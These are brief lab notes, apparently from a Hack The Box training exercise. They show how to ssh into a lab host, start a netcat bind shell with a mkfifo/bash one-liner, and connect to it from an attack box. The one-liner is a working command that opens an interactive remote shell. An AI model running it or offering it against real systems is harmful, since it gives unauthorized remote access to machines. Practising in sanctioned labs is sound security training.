1.ssh into the target
	a.ssh htb-student@10.129.201.134
2.set up the bind shell listener 
	a.rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <TARGET_IP> <PORT> > /tmp/f
3.Connect from Pwnbox using netcat
	a.nc -nv <TARGET_IP> <PORT>